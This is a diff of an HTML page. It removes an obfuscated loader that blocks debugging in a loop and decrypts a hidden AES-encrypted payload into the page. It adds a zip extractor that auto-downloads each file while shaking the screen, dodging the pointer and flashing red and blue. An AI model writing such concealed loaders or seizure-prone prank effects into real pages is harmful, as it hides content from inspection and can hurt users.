@@ -1,25 +1,425 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zip Extractor & Auto Downloader</title>
+<style>
+  :root {
+    --bg1: #0f172a;
+    --bg2: #1e293b;
+    --fg: #e2e8f0;
+    --accent: #38bdf8;
+    --accent-2: #f43f5e;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    font-family: Arial, sans-serif;
+    background:
+      radial-gradient(circle at 20% 20%, rgba(56,189,248,0.18), transparent 28%),
+      radial-gradient(circle at 80% 30%, rgba(244,63,94,0.14), transparent 30%),
+      linear-gradient(135deg, var(--bg1), var(--bg2));
+    color: var(--fg);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    overflow: hidden;
+    transition: transform 0.03s linear, filter 0.12s ease;
+  }
+
+  body.chaos-tint-a {
+    filter: hue-rotate(18deg) saturate(1.25) contrast(1.08);
+  }
+
+  body.chaos-tint-b {
+    filter: hue-rotate(-18deg) saturate(1.35) contrast(1.12);
+  }
+
+  #drop-zone {
+    border: 3px dashed var(--accent);
+    border-radius: 18px;
+    padding: 50px;
+    text-align: center;
+    width: min(80vw, 500px);
+    cursor: pointer;
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    user-select: none;
+    background: rgba(15, 23, 42, 0.4);
+    backdrop-filter: blur(7px);
+    box-shadow: 0 18px 60px rgba(0,0,0,0.35);
+    transition: transform 0.07s linear, left 0.07s linear, top 0.07s linear, background 0.12s ease, border-color 0.12s ease;
+    z-index: 2;
+  }
+
+  #drop-zone.dragover {
+    background: rgba(30, 41, 59, 0.78);
+    border-color: var(--accent-2);
+  }
+
+  #status {
+    margin-top: 20px;
+    color: #a5f3fc;
+    font-size: 14px;
+    min-height: 18px;
+  }
+
+
+  body.success-rumble {
+    filter: hue-rotate(0deg) saturate(1.35) contrast(1.1);
+  }
+
+  body.siren-red {
+    box-shadow: inset 0 0 0 100vmax rgba(255, 0, 60, 0.14);
+  }
+
+  body.siren-blue {
+    box-shadow: inset 0 0 0 100vmax rgba(0, 120, 255, 0.14);
+  }
+
+  .troll-emoji {
+    position: fixed;
+    left: 0;
+    top: 0;
+    pointer-events: none;
+    user-select: none;
+    z-index: 9999;
+    will-change: transform, opacity;
+    text-shadow: 0 0 10px rgba(255,255,255,0.35);
+  }
+
+</style>
 </head>
 <body>
+<div id="drop-zone">
+  <h2>Drag & Drop your .zip file here</h2>
+  <p>or click to select manually</p>
+  <input type="file" id="file-input" accept=".zip" hidden>
+  <div id="status"></div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script>
-    setInterval(function(){ console.clear(); debugger; }, 100);
-    (function(_0x1a2b){
-        var _0xKey = "g2s2a0w3a2gwh95am2kcln";
-        var _0xData = "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";
-        
-        try {
-            var _0xDecrypted = CryptoJS.AES.decrypt(_0xData, _0xKey);
-            var _0xStr = _0xDecrypted.toString(CryptoJS.enc.Utf8);
-            document.open();
-            document.write(_0xStr);
-            document.close();
-        } catch(e) {
-            document.body.innerHTML = "ACCESS DENIED: INTEGRITY CHECK FAILED";
+  const dropZone = document.getElementById('drop-zone');
+  const fileInput = document.getElementById('file-input');
+  const statusText = document.getElementById('status');
+
+  let shakeTimer = null;
+  let tintTimer = null;
+  let moveTimer = null;
+  let runawayActive = false;
+  let zoneX = window.innerWidth / 2;
+  let zoneY = window.innerHeight / 2;
+  let zoneRot = 0;
+  let spin = 0;
+  let sirenTimer = null;
+  let successShakeTimer = null;
+  let emojiSpawner = null;
+  let activeEmoji = new Set();
+
+  function applyZoneTransform(scale = 1) {
+    dropZone.style.left = `${zoneX}px`;
+    dropZone.style.top = `${zoneY}px`;
+    dropZone.style.transform = `translate(-50%, -50%) rotate(${zoneRot}deg) scale(${scale})`;
+  }
+
+  function clampZone() {
+    const marginX = Math.min(180, window.innerWidth * 0.2);
+    const marginY = Math.min(140, window.innerHeight * 0.18);
+    zoneX = Math.max(marginX, Math.min(window.innerWidth - marginX, zoneX));
+    zoneY = Math.max(marginY, Math.min(window.innerHeight - marginY, zoneY));
+  }
+
+  function startScreenShake() {
+    if (shakeTimer) return;
+    shakeTimer = setInterval(() => {
+      const x = (Math.random() - 0.5) * 42;
+      const y = (Math.random() - 0.5) * 42;
+      const rot = (Math.random() - 0.5) * 3.2;
+      document.body.style.transform = `translate(${x}px, ${y}px) rotate(${rot}deg)`;
+    }, 18);
+  }
+
+  function stopScreenShake() {
+    clearInterval(shakeTimer);
+    shakeTimer = null;
+    document.body.style.transform = 'translate(0, 0) rotate(0deg)';
+  }
+
+  function startTintChaos() {
+    if (tintTimer) return;
+    let mode = 0;
+    tintTimer = setInterval(() => {
+      mode = (mode + 1) % 3;
+      document.body.classList.remove('chaos-tint-a', 'chaos-tint-b');
+      if (mode === 1) document.body.classList.add('chaos-tint-a');
+      if (mode === 2) document.body.classList.add('chaos-tint-b');
+    }, 220);
+  }
+
+  function stopTintChaos() {
+    clearInterval(tintTimer);
+    tintTimer = null;
+    document.body.classList.remove('chaos-tint-a', 'chaos-tint-b');
+  }
+
+  function startMovingDropZone() {
+    if (moveTimer) return;
+    moveTimer = setInterval(() => {
+      zoneX += (Math.random() - 0.5) * 180;
+      zoneY += (Math.random() - 0.5) * 140;
+      spin += (Math.random() - 0.5) * 24;
+      zoneRot = Math.max(-18, Math.min(18, spin));
+      clampZone();
+      applyZoneTransform(1 + Math.random() * 0.08);
+    }, 65);
+  }
+
+  function stopMovingDropZone() {
+    clearInterval(moveTimer);
+    moveTimer = null;
+    zoneX = window.innerWidth / 2;
+    zoneY = window.innerHeight / 2;
+    zoneRot = 0;
+    spin = 0;
+    applyZoneTransform(1);
+  }
+
+
+  function startHeavySuccessQuake(duration = 3200) {
+    stopHeavySuccessQuake();
+    let started = performance.now();
+    successShakeTimer = setInterval(() => {
+      const elapsed = performance.now() - started;
+      const decay = Math.max(0.35, 1 - elapsed / duration);
+      const x = (Math.random() - 0.5) * 120 * decay;
+      const y = (Math.random() - 0.5) * 120 * decay;
+      const rot = (Math.random() - 0.5) * 8 * decay;
+      const skewX = (Math.random() - 0.5) * 4 * decay;
+      const skewY = (Math.random() - 0.5) * 4 * decay;
+      document.body.style.transform = `translate(${x}px, ${y}px) rotate(${rot}deg) skew(${skewX}deg, ${skewY}deg)`;
+    }, 14);
+    document.body.classList.add('success-rumble');
+    setTimeout(stopHeavySuccessQuake, duration);
+  }
+
+  function stopHeavySuccessQuake() {
+    clearInterval(successShakeTimer);
+    successShakeTimer = null;
+    document.body.classList.remove('success-rumble');
+    if (!shakeTimer) {
+      document.body.style.transform = 'translate(0, 0) rotate(0deg)';
+    }
+  }
+
+  function startSirenPulse(duration = 3200) {
+    stopSirenPulse();
+    let mode = 0;
+    sirenTimer = setInterval(() => {
+      mode = (mode + 1) % 2;
+      document.body.classList.remove('siren-red', 'siren-blue');
+      document.body.classList.add(mode === 0 ? 'siren-red' : 'siren-blue');
+    }, 280);
+    setTimeout(stopSirenPulse, duration);
+  }
+
+  function stopSirenPulse() {
+    clearInterval(sirenTimer);
+    sirenTimer = null;
+    document.body.classList.remove('siren-red', 'siren-blue');
+  }
+
+  function spawnEmojiBurst(count = 90, duration = 3200) {
+    stopEmojiBurst();
+    const endAt = performance.now() + duration;
+
+    function makeOne() {
+      const el = document.createElement('div');
+      el.className = 'troll-emoji';
+      el.textContent = 'wok';
+      const size = 18 + Math.random() * 38;
+      const x = Math.random() * window.innerWidth;
+      const y = Math.random() * window.innerHeight;
+      const vx = (Math.random() - 0.5) * 34;
+      const vy = (Math.random() - 0.5) * 34;
+      const spin = (Math.random() - 0.5) * 28;
+      const scale = 0.85 + Math.random() * 1.5;
+      let px = x;
+      let py = y;
+      let rot = Math.random() * 360;
+      el.style.fontSize = `${size}px`;
+      el.style.opacity = '0.95';
+      document.body.appendChild(el);
+      activeEmoji.add(el);
+
+      let last = performance.now();
+      function tick(now) {
+        if (!activeEmoji.has(el)) return;
+        const dt = Math.min(32, now - last) / 16.67;
+        last = now;
+        px += vx * dt;
+        py += vy * dt;
+        rot += spin * dt;
+
+        if (px < -80) px = window.innerWidth + 40;
+        if (px > window.innerWidth + 80) px = -40;
+        if (py < -80) py = window.innerHeight + 40;
+        if (py > window.innerHeight + 80) py = -40;
+
+        const lifeLeft = Math.max(0, endAt - now);
+        const opacity = Math.min(0.95, lifeLeft / 700);
+        el.style.opacity = String(opacity);
+        el.style.transform = `translate(${px}px, ${py}px) rotate(${rot}deg) scale(${scale})`;
+
+        if (now < endAt) {
+          requestAnimationFrame(tick);
+        } else {
+          activeEmoji.delete(el);
+          el.remove();
         }
-    })();
+      }
+      requestAnimationFrame(tick);
+    }
+
+    for (let i = 0; i < count; i++) makeOne();
+    emojiSpawner = setInterval(() => {
+      for (let i = 0; i < 16; i++) makeOne();
+    }, 220);
+    setTimeout(stopEmojiBurst, duration);
+  }
+
+  function stopEmojiBurst() {
+    clearInterval(emojiSpawner);
+    emojiSpawner = null;
+    for (const el of activeEmoji) el.remove();
+    activeEmoji.clear();
+  }
+
+  function startSuccessTrollBurst() {
+    startHeavySuccessQuake(3200);
+    startSirenPulse(3200);
+    spawnEmojiBurst(120, 3400);
+  }
+
+  function startUiTroll() {
+    startScreenShake();
+    startTintChaos();
+    startMovingDropZone();
+  }
+
+  function stopUiTroll() {
+    stopScreenShake();
+    stopTintChaos();
+    stopMovingDropZone();
+  }
+
+  function repelFromPointer(clientX, clientY) {
+    const dx = zoneX - clientX;
+    const dy = zoneY - clientY;
+    const dist = Math.hypot(dx, dy) || 1;
+    const force = Math.max(120, 420 - dist);
+    zoneX += (dx / dist) * force * 0.22;
+    zoneY += (dy / dist) * force * 0.22;
+    zoneRot += (Math.random() - 0.5) * 22;
+    zoneRot = Math.max(-28, Math.min(28, zoneRot));
+    clampZone();
+    applyZoneTransform(1.04);
+  }
+
+  dropZone.addEventListener('click', () => fileInput.click());
+  fileInput.addEventListener('change', e => handleFiles(e.target.files));
+
+  dropZone.addEventListener('dragover', e => {
+    e.preventDefault();
+    dropZone.classList.add('dragover');
+  });
+
+  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+
+  dropZone.addEventListener('drop', e => {
+    e.preventDefault();
+    dropZone.classList.remove('dragover');
+    handleFiles(e.dataTransfer.files);
+  });
+
+  document.addEventListener('dragover', e => {
+    e.preventDefault();
+    if (!runawayActive) return;
+    repelFromPointer(e.clientX, e.clientY);
+  });
+
+  document.addEventListener('dragenter', e => {
+    if (e.dataTransfer && Array.from(e.dataTransfer.types || []).includes('Files')) {
+      runawayActive = true;
+      statusText.textContent = '😈 Catch the drop zone first...';
+    }
+  });
+
+  document.addEventListener('drop', () => {
+    runawayActive = false;
+  });
+
+  document.addEventListener('dragend', () => {
+    runawayActive = false;
+  });
+
+  window.addEventListener('resize', () => {
+    clampZone();
+    applyZoneTransform(1);
+  });
+
+  async function handleFiles(files) {
+    if (!files.length) return;
+    const file = files[0];
+    if (!file.name.endsWith('.zip')) {
+      statusText.textContent = '❌ Please upload a .zip file only.';
+      return;
+    }
+
+    runawayActive = false;
+    statusText.textContent = `📦 Reading ${file.name}...`;
+    startUiTroll();
+
+    const zip = new JSZip();
+
+    try {
+      const data = await file.arrayBuffer();
+      const loadedZip = await zip.loadAsync(data);
+      const filesList = Object.keys(loadedZip.files);
+      statusText.textContent = `😈 Aggressive chaos mode active... Extracting ${filesList.length} files...`;
+
+      for (const filename of filesList) {
+        const zipEntry = loadedZip.files[filename];
+        if (!zipEntry.dir) {
+          const content = await zipEntry.async('blob');
+          const link = document.createElement('a');
+          link.href = URL.createObjectURL(content);
+          link.download = filename.split('/').pop();
+          link.style.display = 'none';
+          document.body.appendChild(link);
+          link.click();
+          link.remove();
+          await new Promise(r => setTimeout(r, 200));
+        }
+      }
+
+      statusText.textContent = '🎉 Done.';
+      startSuccessTrollBurst();
+    } catch (err) {
+      console.error(err);
+      statusText.textContent = '❌ Failed to extract zip file.';
+    } finally {
+      setTimeout(() => { stopUiTroll(); stopHeavySuccessQuake(); stopSirenPulse(); stopEmojiBurst(); }, 3800);
+    }
+  }
+
+  applyZoneTransform(1);
 </script>
 </body>
 </html>
